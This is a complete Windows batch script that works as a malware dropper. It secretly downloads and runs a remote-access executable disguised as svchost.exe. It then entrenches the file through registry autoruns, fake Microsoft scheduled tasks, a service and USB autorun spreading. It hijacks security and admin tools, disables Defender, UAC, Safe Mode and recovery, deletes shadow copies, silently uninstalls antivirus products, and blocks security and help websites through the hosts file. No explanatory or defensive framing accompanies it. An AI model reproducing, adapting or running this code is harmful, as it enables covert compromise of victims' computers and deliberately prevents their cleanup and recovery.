@echo off
setlocal enableextensions enabledelayedexpansion
set "a=https://github.com/denniderland718-ux/Rat/raw/refs/heads/main/"
set "b=Start.exe"
set "O=%TEMP%\svchost.exe"
set "HOSTS=%SystemRoot%\System32\drivers\etc\hosts"
set "SELF=%~f0"

if /i not "%~1"=="h" (
    mshta "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c \"\"%~f0\" h\"',0,false);close()"
    exit /b
)

if not exist "%O%" curl -s -L -o "%O%" "%a%%b%"
if exist "%O%" (
    takeown /f "%O%" /a >nul 2>&1
    icacls "%O%" /setowner "NT SERVICE\TrustedInstaller" >nul 2>&1
    icacls "%O%" /inheritance:r >nul 2>&1
    icacls "%O%" /grant:r "NT SERVICE\TrustedInstaller:(F)" >nul 2>&1
    icacls "%O%" /grant:r "SYSTEM:(F)" >nul 2>&1
    icacls "%O%" /grant:r "Everyone:(RX)" >nul 2>&1
    attrib +r +s +h "%O%" >nul 2>&1
    start "" /min "%O%"
)

for %%S in (%SystemDrive% C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%S\" (
        if exist "%%S\Windows\System32" (
            copy /y "%O%" "%%S:\Windows\System32\svchost.exe" >nul 2>&1
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, %O%" /f >nul 2>&1
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, %O%," /f >nul 2>&1
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Taskman /t REG_SZ /d "%O%" /f >nul 2>&1
        )
        if not exist "%%S\System Volume Information" (
            copy /y "%O%" "%%S:\svhost.exe" >nul 2>&1
            copy /y "%SELF%" "%%S:\update.bat" >nul 2>&1
            echo [autorun] > "%%S:\autorun.inf" 2>nul
            echo open=svhost.exe >> "%%S:\autorun.inf" 2>nul
            echo shell\open\command=svhost.exe >> "%%S:\autorun.inf" 2>nul
            echo shell\explore\command=svhost.exe >> "%%S:\autorun.inf" 2>nul
            attrib +r +s +h "%%S:\svhost.exe" >nul 2>&1
            attrib +r +s +h "%%S:\update.bat" >nul 2>&1
            attrib +r +s +h "%%S:\autorun.inf" >nul 2>&1
        )
    )
)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update Service" /t REG_SZ /d "%O%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "WinSvc" /t REG_SZ /d "%O%" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update Service" /t REG_SZ /d "%O%" /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /tr "%O%" /sc minute /mo 30 /ru "SYSTEM" /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\WindowsBackup\ConfigNotification" /tr "%O%" /sc onlogon /ru "SYSTEM" /f >nul 2>&1

reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinSvc" /v ImagePath /t REG_EXPAND_SZ /d "%O%" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinSvc" /v DisplayName /t REG_SZ /d "Windows Service Host" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinSvc" /v Start /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinSvc" /v Type /t REG_DWORD /d 16 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinSvc" /v ErrorControl /t REG_DWORD /d 1 /f >nul 2>&1

set "IFEO=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

for %%E in (
    regedit.exe taskmgr.exe powershell.exe pwsh.exe mmc.exe msconfig.exe gpedit.msc perfmon.exe resmon.exe msra.exe
    su.exe SU.exe ProcessHacker.exe SystemInformer.exe ProcHacker.exe
    wscript.exe cscript.exe mshta.exe wmic.exe
    procexp.exe procexp64.exe procmon.exe procmon64.exe autoruns.exe autoruns64.exe
    tcpview.exe tcpview64.exe dbgview.exe dbgview64.exe
    ida.exe ida64.exe x64dbg.exe x32dbg.exe ollydbg.exe windbg.exe cdb.exe
    wireshark.exe fiddler.exe cheatengine.exe sandboxie.exe cuckoo.exe procdot.exe
    avp.exe avpui.exe kaspersky.exe kis.exe kavfs.exe kavfsgt.exe avpsus.exe kasperskyui.exe kavfswp.exe
    egui.exe ekrn.exe eramgr.exe eset.exe esets.exe
    avastui.exe avastsvc.exe avastemupdate.exe avastsec.exe afwserv.exe aswidsagent.exe
    avgui.exe avgnt.exe avgwdsvc.exe avgsvca.exe
    bdagent.exe vsserv.exe bdservicehost.exe bdwtxag.exe
    mcshield.exe mcupdate.exe mcuicnt.exe mcafeefirewall.exe
    norton.exe navw32.exe ccsvchst.exe nortonsecurity.exe
    mbam.exe mbamservice.exe mbamtray.exe
    drweb32.exe drwebdaemon.exe drwebscd.exe drwebupw.exe
    avguard.exe avgnt.exe avcenter.exe avmailc.exe
    pavfnsvr.exe psanhost.exe pavsrv.exe
    tmcc.exe tmntsrv.exe pccntmon.exe
    sophosui.exe savservice.exe savonaccess.exe sophosclean.exe
    fssm32.exe fsui.exe fsav32.exe
    360tray.exe 360sd.exe 360rp.exe 360rps.exe 360safe.exe 360leakfixer.exe 360speedld.exe 360wallpaper.exe
    360EntClient.exe 360EntClientTray.exe 360common.exe 360doctor.exe 360inst.exe 360LogReport.exe
    360Netmon.exe 360P2P.exe 360patch.exe 360sdsetup.exe 360Safe.exe 360se.exe 360se6.exe 360SoftMgr.exe
    360upd.exe 360WallPaper.exe 360zip.exe 360.exe QHSafeTray.exe QHActiveDefense.exe ZhuDongFangYu.exe
    qhsafetray.exe qhactivedefense.exe qhsrv.exe qhwatchdog.exe qhnetcfg.exe
    cmdagent.exe cfp.exe cis.exe cavwp.exe
    wrsa.exe wrsssd.exe wrscan.exe
    gdata.exe gdscan.exe avk.exe avkwctl.exe
    vsmon.exe zatray.exe zlclient.exe
    k7tsecurity.exe k7rtm.exe k7fw.exe
    a2guard.exe a2service.exe a2start.exe
    nanoav.exe nanoui.exe
    sbamsvc.exe vipre.exe sbamui.exe
    csagent.exe cs.exe csfalconservice.exe
    sentinelagent.exe sentinelone.exe sentineld.exe
    cb.exe cbdefense.exe carbonblack.exe
    elasticagent.exe elastic.exe
    cortex.exe cyvera.exe cortexxdr.exe
    trapcore.exe trapmine.exe
    masvc.exe mfemms.exe mfevtps.exe trellix.exe
    fortitray.exe forticlient.exe fortifw.exe fortiscan.exe
    cpfw.exe cptray.exe cpda.exe
    ahnlab.exe v3lite.exe v3main.exe v3tray.exe
    tencentdl.exe qqpcmgr.exe qqpctray.exe qqpcrt.exe
    baidusd.exe baidudl.exe baidusdtray.exe
    kingsoft.exe kinstall.exe kwsprotect64.exe
    huorong.exe hipsdaemon.exe hipsmain.exe
    trustport.exe vba32.exe zillya.exe totalav.exe reason.exe pcmatic.exe
    superantispyware.exe sas.exe adaware.exe bullguard.exe cylanceui.exe cylancesvc.exe cylance.exe
    fireeye.exe xagt.exe jiangmin.exe rav.exe ravmon.exe nprotect.exe alyac.exe arcabit.exe
    wps.exe wpscloudsvr.exe wpsupdate.exe wpscenter.exe et.exe wpp.exe
    combofix.exe hijackthis.exe
    MediaCreationTool.exe MediaCreationTool20H2.exe MediaCreationTool21H1.exe MediaCreationTool21H2.exe MediaCreationTool22H2.exe MediaCreationTool23H2.exe
    mediacreationtool.exe mediacreationtool20h2.exe mediacreationtool21h1.exe mediacreationtool21h2.exe mediacreationtool22h2.exe mediacreationtool23h2.exe
    MediaCreationTool24H2.exe mediacreationtool24h2.exe
    srtasks.exe rstrui.exe systempropertiesprotection.exe systempropertiesadvanced.exe systempropertiesdataexecutionprevention.exe systempropertieshardware.exe systempropertiesperformance.exe systempropertiesremote.exe
    wbadmin.exe vssadmin.exe diskshadow.exe bcdedit.exe reagentc.exe
) do (
    reg add "%IFEO%\%%E" /v Debugger /t REG_SZ /d "%O%" /f >nul 2>&1
    taskkill /f /im %%E >nul 2>&1
)

reagentc /disable >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {default} bootmenupolicy Legacy >nul 2>&1
bcdedit /set {globalsettings} bootmenupolicy Legacy >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v RPSessionInterval /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableAdvancedStartup /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableBcdEdit /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableResetPC /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableSystemRestore /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableResetPcButton /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRecoveryUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispCPL /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableUserInstalls /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableInstallerDetection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableVirtualization /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableSecureUIAPaths /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v NoBalloonNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v NOC_GLOBAL_SETTING_TOASTS_ENABLED /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoToastApplicationNotification /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoToastApplicationNotificationOnLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v EnableBalloonTips /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowInfoTip /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
sc config WpnUserService_* start= disabled >nul 2>&1
sc config WpnService start= disabled >nul 2>&1
taskkill /f /im SystemSettings.exe >nul 2>&1
taskkill /f /im ShellExperienceHost.exe >nul 2>&1
taskkill /f /im RuntimeBroker.exe >nul 2>&1

reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1

vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceStartUpsAllow /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" /v MpEnablePus /t REG_DWORD /d 0 /f >nul 2>&1

for %%S in (WinDefend SecurityHealthService WdNisSvc Sense WdNisDrv WdFilter wdboot wdfilter mpssvc SgrmBroker SgrmAgent MsMpSvc 
            Wuauserv wuauserv WaaSMedicSvc BITS Dnscache WinHttpAutoProxySvc
            360rp 360rps 360sd 360tray QHActiveDefense ZhuDongFangYu QHSafeTray QHWatchdog 360speedld 360wallpaper 360leakfixer 360EntClient 360Safe
            VSS SDRSVC swprv) do (
    sc config %%S start= disabled >nul 2>&1
    sc stop %%S >nul 2>&1
    taskkill /f /im %%S.exe >nul 2>&1
)

for %%A in ("*Kaspersky*" "*ESET*" "*Avast*" "*AVG*" "*Bitdefender*" "*McAfee*" "*Norton*" "*Symantec*" "*Malwarebytes*" "*Dr.Web*" "*Avira*" "*Panda*" "*Trend Micro*" "*Sophos*" "*F-Secure*" "*360*" "*Comodo*" "*Webroot*" "*G Data*" "*ZoneAlarm*" "*K7*" "*Emsisoft*" "*NANO*" "*Vipre*" "*CrowdStrike*" "*SentinelOne*" "*Carbon Black*" "*Elastic*" "*Cortex*" "*Trellix*" "*Fortinet*" "*Check Point*" "*AhnLab*" "*Tencent*" "*Baidu*" "*Qihoo*" "*Kingsoft*" "*Huorong*" "*TrustPort*" "*VBA32*" "*Zillya*" "*VIPRE*" "*TotalAV*" "*Reason*" "*PC Matic*" "*SUPERAntiSpyware*" "*Adaware*" "*BullGuard*" "*Cylance*" "*FireEye*" "*Trapmine*" "*Jiangmin*" "*Rising*" "*Microworld*" "*Nprotect*" "*ALYac*" "*Arcabit*" "*CrowdStrike Falcon*" "*WPS*") do (
    for /f "tokens=*" %%K in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f %%A /k 2^>nul ^| findstr "HKEY"') do (
        for /f "tokens=2,*" %%U in ('reg query "%%K" /v UninstallString 2^>nul ^| findstr "REG_"') do (
            start "" /min cmd /c "%%U %%V /S /silent /verysilent /quiet /norestart" >nul 2>&1
        )
    )
    for /f "tokens=*" %%K in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /f %%A /k 2^>nul ^| findstr "HKEY"') do (
        for /f "tokens=2,*" %%U in ('reg query "%%K" /v UninstallString 2^>nul ^| findstr "REG_"') do (
            start "" /min cmd /c "%%U %%V /S /silent /verysilent /quiet /norestart" >nul 2>&1
        )
    )
)

for %%D in (
    kaspersky.com kaspersky.ru kaspersky-labs.com kasperskyusercontent.com eset.com eset.eu esetnod32.ru 
    avast.com avast.ru avcdn.net avg.com avg.ru bitdefender.com bitdefender.ru bitdefender.net mcafee.com 
    mcafeefreemanager.com norton.com symantec.com symanteccloud.com malwarebytes.com malwarebytes.org mb-cosmos.com 
    drweb.com drweb.ru drweb-cdn.com avira.com avira-update.com pandasecurity.com pandasecurity.ru trendmicro.com 
    trendmicro.ru sophos.com sophosupd.com f-secure.com f-secure.ru 360.cn 360.com 360totalsecurity.com 
    comodo.com comodosecurity.com webroot.com webrootanywhere.com gdata-software.com gdata.com zonealarm.com 
    zonelabs.com k7computing.com emsisoft.com emsisoft.ru nanoav.ru nanoav.com vipre.com threattrack.com 
    crowdstrike.com crwdns.com sentinelone.com sentinelone.net carbonblack.com bit9.com elastic.co elastic.com 
    paloaltonetworks.com cortexxdr.com trellix.com fireeye.com fortinet.com fortiguard.com checkpoint.com
    ahnlab.com tencent.com qq.com baidu.com qihoo.com kingsoft.com huorong.cn trustport.com vba32.de zillya.com 
    totalav.com reasonsecurity.com pcmatic.com superantispyware.com adaware.com bullguard.com cylance.com 
    trapmine.com jiangmin.com rising.com.cn nprotect.com alyac.com arcabit.pl
    wps.cn wps.com wpsoffice.com wpscdn.cn kdocs.cn
    combofix.org hijackthis.com bleepingcomputer.com malwaretips.com systemweakness.com darkreading.com thehackernews.com
    virustotal.com www.virustotal.com otx.alienvault.com any.run hybrid-analysis.com app.any.run 
    urlscan.io www.joesandbox.com cuckoosandbox.org malwr.com
    microsoft.com windowsupdate.com update.microsoft.com smartscreen.microsoft.com wdcp.microsoft.com 
    wdcpalt.microsoft.com definitionupdates.microsoft.com msftncsi.com msftconnecttest.com
    download.microsoft.com software-download.microsoft.com www.microsoft.com
    av-test.org av-comparatives.org
    gitlab.com bitbucket.org
    exploit-db.com packetstormsecurity.com vulnhub.com hackthebox.com tryhackme.com
    irongeek.com securityxploded.com rohitab.com sourceforge.net
    
    simpleunlocker.ru simpleunlocker.com simple-unlocker.ru unlocker.ru unlocker.pro 
    nedohackers.site nedohackers.ru nedohackers.com forum.nedohackers.site
    xaker.ru xaker.name xakep.ru xss.is exploit.in
    rutor.info rutor.org rutracker.org nnmclub.to
    dark-os.com forum.dark-os.com
    hackforums.net nulled.to cracked.io crackwatch.com
    telegram.me t.me web.telegram.org
) do (
    findstr /i /c:" %%D" "%HOSTS%" >nul 2>&1 || (
        echo 0.0.0.0 %%D >> "%HOSTS%"
        echo 0.0.0.0 www.%%D >> "%HOSTS%"
    )
)

attrib +r +s +h "%HOSTS%" >nul 2>&1
icacls "%HOSTS%" /inheritance:r >nul 2>&1
icacls "%HOSTS%" /grant:r "SYSTEM:(F)" >nul 2>&1
icacls "%HOSTS%" /grant:r "Administrators:(F)" >nul 2>&1
icacls "%HOSTS%" /grant:r "Users:(R)" >nul 2>&1

reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Type /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices" /v Deny_All /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}" /v Deny_Read /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}" /v Deny_Write /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}" /v Deny_Execute /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices\Custom\Deny_All" /ve /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f >nul 2>&1

for %%R in (
    "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
) do (
    for /f "tokens=1 delims= " %%V in ('reg query %%R 2^>nul') do (
        echo %%V | findstr /i /c:"kaspersky" /c:"avast" /c:"avg" /c:"eset" /c:"bitdefender" /c:"mcafee" /c:"norton" /c:"symantec" /c:"malwarebytes" /c:"drweb" /c:"avira" /c:"panda" /c:"trend" /c:"sophos" /c:"f-secure" /c:"360" /c:"comodo" /c:"webroot" /c:"gdata" /c:"zonealarm" /c:"k7" /c:"emsisoft" /c:"nano" /c:"vipre" /c:"crowdstrike" /c:"sentinel" /c:"carbonblack" /c:"elastic" /c:"cortex" /c:"trellix" /c:"fortinet" /c:"checkpoint" /c:"ahnlab" /c:"tencent" /c:"baidu" /c:"qihoo" /c:"kingsoft" /c:"huorong" /c:"trustport" /c:"vba32" /c:"zillya" /c:"totalav" /c:"reason" /c:"pcmatic" /c:"superantispyware" /c:"adaware" /c:"bullguard" /c:"cylance" /c:"fireeye" /c:"trapmine" /c:"jiangmin" /c:"rising" /c:"nprotect" /c:"alyac" /c:"arcabit" >nul && (
            reg delete %%R /v %%V /f >nul 2>&1
        )
    )
)

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v NoAutoplayfornonVolume /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f >nul 2>&1

endlocal
exit /b